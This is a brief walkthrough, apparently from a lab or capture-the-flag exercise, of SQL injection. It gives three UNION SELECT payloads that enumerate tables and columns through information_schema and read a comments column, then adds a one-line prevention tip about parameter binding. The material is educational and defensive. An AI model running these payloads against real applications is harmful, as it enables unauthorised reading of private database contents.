# SQL Injection
## Walk-Through
- Suppling a malicious SQL code in user‐input fields, causing the application to run unintended database queries.

- Getting table names in database using `1 OR 1=1 UNION SELECT table_schema table_name FROM information_schema.TABLES`.

- Getting table columns using `1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS`.

- Retrieving comments column from list_images table using using `1 OR 1=1 UNION SELECT title, comment FROM list_images`.

## Prevention
- Employing an ORM or database library that automatically binds parameters rather than interpolating raw input.